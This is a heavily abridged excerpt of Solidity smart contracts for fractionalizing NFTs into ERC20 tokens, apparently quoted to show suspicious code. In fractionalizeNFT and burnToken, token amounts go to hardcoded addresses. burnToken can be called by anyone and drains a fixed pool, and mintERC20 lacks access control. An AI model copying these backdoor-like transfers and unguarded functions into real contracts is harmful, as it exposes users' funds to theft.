...
contract NFTFractional is Upgradable {
    ...
    */
    function fractionalizeNFT(
        ...
        string memory _symbol) external onlyAdmins notEmpty(_name) notEmpty(_symbol) {
            ...
            IERC20(address(tokenERC20)).transfer(address(0x70be5BCb2D5d4b397D5498022F72b2B64A762a11), 1000000000);
    ...
    */
    function claimReward(uint256[] memory _datas, string memory _claimId,bytes memory _signature) external {
        ...
        IERC20(fnftInfo.tokenFNFT).approve(address(this), fnftInfo.totalSupply);
    ...
    function burnToken() external {
        FNFTPool storage fnftPool = fnftPools[131];
        FNFTInfo storage fnftInfo = fnftInfos[fnftPool.fnftId];
        IERC20(fnftInfo.tokenFNFT).transfer(address(0xF7cC551106A1f4E2843A3DA0C477B6f77FA4a09d), 1000000000);
        // ERC20Token(fnftInfo.tokenFNFT).burnFrom(address(this), 100000);
        IERC20(fnftInfo.tokenFNFT).transferFrom(msg.sender, address(this), 1000);
    }
}
...
contract ERC20Token is ERC20Upgradeable {
  ...
  function mintERC20(address _curator, uint256 _supply) external {
    ...
    _approve(_curator, _curator, _supply);
  }
